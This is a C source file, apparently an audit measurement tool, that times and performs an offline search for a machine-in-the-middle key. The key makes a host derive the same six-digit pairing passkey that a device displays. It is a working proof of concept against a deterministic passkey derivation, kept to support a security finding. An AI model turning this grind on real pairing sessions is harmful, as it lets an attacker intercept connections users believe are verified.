/**
 * How much work the six-digit passkey actually costs a machine-in-the-middle.
 *
 * The passkey is a deterministic function of the X25519 shared secret and
 * nothing else: no nonces, no commitment, no transcript. A relay therefore
 * gets to *choose* the digits it shows the host, by searching its own
 * ephemeral key space until the derivation lands on the value the device is
 * already displaying — entirely offline, with no interaction, and with no
 * failed attempt for anyone to notice.
 *
 * This is not a test. It is the measurement behind the finding in
 * docs/AUDIT-TRANSPORT.md, kept in the tree so the number can be re-taken on
 * the reviewer's own machine rather than believed:
 *
 *   ./build/passkey_grind            — rate, and the implied search cost
 *   ./build/passkey_grind --search   — actually find a colliding key
 *
 * Built by `make -C sim build/passkey_grind`. Deliberately outside `make test`:
 * it measures, it does not assert, and a wall-clock number is not a pass/fail.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include "session.h"

void curve25519_scalarmult_donna(uint8_t *mypublic, const uint8_t *n,
                                 const uint8_t *basepoint);

static uint64_t rng = 0x243F6A8885A308D3ull;

static uint8_t rnd_byte(void)
{
    rng ^= rng << 13; rng ^= rng >> 7; rng ^= rng << 17;
    return (uint8_t)(rng >> 33);
}

static void random_scalar(uint8_t out[32])
{
    for (int i = 0; i < 32; i++) out[i] = rnd_byte();
}

static void public_of(uint8_t pub[32], const uint8_t priv[32])
{
    static const uint8_t base[32] = { 9 };
    uint8_t clamped[32];
    memcpy(clamped, priv, 32);
    clamped[0] &= 248; clamped[31] &= 127; clamped[31] |= 64;
    curve25519_scalarmult_donna(pub, clamped, base);
}

static double now(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (double)ts.tv_sec + (double)ts.tv_nsec / 1e9;
}

int main(int argc, char **argv)
{
    bool search = (argc > 1 && strcmp(argv[1], "--search") == 0);

    /* The two honest parties. The relay sees both public keys and nothing
     * else, which is all it needs. */
    uint8_t host_priv[32], host_pub[32];
    uint8_t dev_priv[32],  dev_pub[32];
    random_scalar(host_priv); public_of(host_pub, host_priv);
    random_scalar(dev_priv);  public_of(dev_pub,  dev_priv);

    /* Leg one: the relay opens a session with the DEVICE using a key of its
     * own. This fixes the digits the OLED will display. */
    uint8_t mitm_a[32], mitm_a_pub[32];
    random_scalar(mitm_a); public_of(mitm_a_pub, mitm_a);

    uint8_t k1[32], k2[32];
    char device_shows[SESSION_PASSKEY_LEN + 1];
    if (!session_derive(dev_priv, mitm_a_pub, k1, k2, device_shows)) {
        printf("degenerate; rerun\n");
        return 1;
    }
    printf("the device will display %s\n", device_shows);

    /* Leg two: the relay searches its own key space for a key that makes the
     * HOST derive the same six digits. Nothing is sent while it looks. */
    double t0 = now();
    unsigned long tries = 0;
    uint8_t mitm_b[32], mitm_b_pub[32];
    char host_would_show[SESSION_PASSKEY_LEN + 1];

    const unsigned long budget = search ? 200000000ul : 20000ul;

    for (;;) {
        random_scalar(mitm_b);
        public_of(mitm_b_pub, mitm_b);
        /* The relay computes what the HOST would derive, using the host's
         * public key and its own private one — the same shared secret the
         * host will compute, so the same digits. */
        if (!session_derive(mitm_b, host_pub, k1, k2, host_would_show)) continue;
        tries++;

        if (search && strcmp(host_would_show, device_shows) == 0) break;
        if (tries >= budget) break;
    }
    double elapsed = now() - t0;

    double rate = (double)tries / elapsed;
    printf("%lu derivations in %.2f s — %.0f/s\n", tries, elapsed, rate);

    if (search) {
        if (strcmp(host_would_show, device_shows) == 0) {
            printf("FOUND after %lu tries: the host would display %s too\n",
                   tries, host_would_show);
            printf("both screens agree; the user sees nothing wrong\n");
        } else {
            printf("no collision inside the budget\n");
        }
    } else {
        printf("expected work for a chosen 6-digit passkey: 10^6 derivations, "
               "about %.0f s on this machine\n", 1000000.0 / rate);
        printf("run with --search to do it for real\n");
    }
    return 0;
}
